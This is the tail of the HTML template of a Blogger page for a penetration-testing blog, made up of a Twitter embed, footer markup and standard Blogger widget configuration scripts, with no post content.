<h2 class='title'>My Twitter Feed</h2>
<div class='widget-content'>
<a class="twitter-timeline"  href="https://twitter.com/nikhil_mitt"  data-widget-id="326546420716945408">Tweets by @nikhil_mitt</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
</div>
<div class='clear'></div>
</div></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='sidebar no-items section' id='sidebar-right-2-1'></div>
</td>
<td class='columns-cell'>
<div class='sidebar no-items section' id='sidebar-right-2-2'></div>
</td>
</tr>
</tbody>
</table>
<div class='sidebar no-items section' id='sidebar-right-3'></div>
</aside>
</div>
</div>
</div>
<div style='clear: both'></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class='main-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<footer>
<div class='footer-outer'>
<div class='footer-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left footer-fauxborder-left'>
<div class='fauxborder-right footer-fauxborder-right'></div>
<div class='region-inner footer-inner'>
<div class='foot no-items section' id='footer-1'></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='foot no-items section' id='footer-2-1'></div>
</td>
<td class='columns-cell'>
<div class='foot no-items section' id='footer-2-2'></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class='foot section' id='footer-3' name='Footer'><div class='widget Attribution' data-version='1' id='Attribution1'>
<div class='widget-content' style='text-align: center;'>
Awesome Inc. theme. Powered by <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
</div>
<div class='clear'></div>
</div></div>
</div>
</div>
<div class='footer-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class='content-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<script type='text/javascript'>
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>

<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/1812387825-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY5jAJ0CH4MJ_jxl7x924mmkZNBZnw:1742572775459';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d8135211063584500909','//www.labofapenetrationtester.com/','8135211063584500909');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '8135211063584500909', 'title': 'Lab of a Penetration Tester', 'url': 'https://www.labofapenetrationtester.com/', 'canonicalUrl': 'http://www.labofapenetrationtester.com/', 'homepageUrl': 'https://www.labofapenetrationtester.com/', 'searchUrl': 'https://www.labofapenetrationtester.com/search', 'canonicalHomepageUrl': 'http://www.labofapenetrationtester.com/', 'blogspotFaviconUrl': 'https://www.labofapenetrationtester.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Lab of a Penetration Tester - Atom\x22 href\x3d\x22https://www.labofapenetrationtester.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Lab of a Penetration Tester - RSS\x22 href\x3d\x22https://www.labofapenetrationtester.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Lab of a Penetration Tester - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/8135211063584500909/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/02092541175521734123\x22 /\x3e\n', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/459db401c2dc748e', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'index', 'pageName': '', 'pageTitle': 'Lab of a Penetration Tester', 'metaDescription': 'Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true, 'variant': 'light', 'variantId': 'light'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Lab of a Penetration Tester', 'description': 'Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.', 'url': 'https://www.labofapenetrationtester.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'crosscol', document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'isCurrentPage': true, 'href': 'https://www.labofapenetrationtester.com/', 'title': 'Home'}, {'isCurrentPage': false, 'href': 'https://www.labofapenetrationtester.com/p/about-me.html', 'id': '5712326216638485656', 'title': 'About Me'}, {'isCurrentPage': false, 'href': 'https://www.labofapenetrationtester.com/p/blog-page.html', 'id': '8966313768456466890', 'title': 'Presentations'}, {'isCurrentPage': false, 'href': 'https://www.labofapenetrationtester.com/p/trainings.html', 'id': '3897680205449387591', 'title': 'Trainings'}], 'mobile': false, 'showPlaceholder': true, 'hasCurrentPage': true}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/791292575-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1964470060-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-1', document.getElementById('Profile1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LinkListView', new _WidgetInfo('LinkList1', 'sidebar-right-1', document.getElementById('LinkList1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'sidebar-right-1', document.getElementById('Text1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text3', 'sidebar-right-1', document.getElementById('Text3'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text2', 'sidebar-right-1', document.getElementById('Text2'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar-right-1', document.getElementById('Label1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar-right-1', document.getElementById('HTML2'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
</script>
</body>
</html>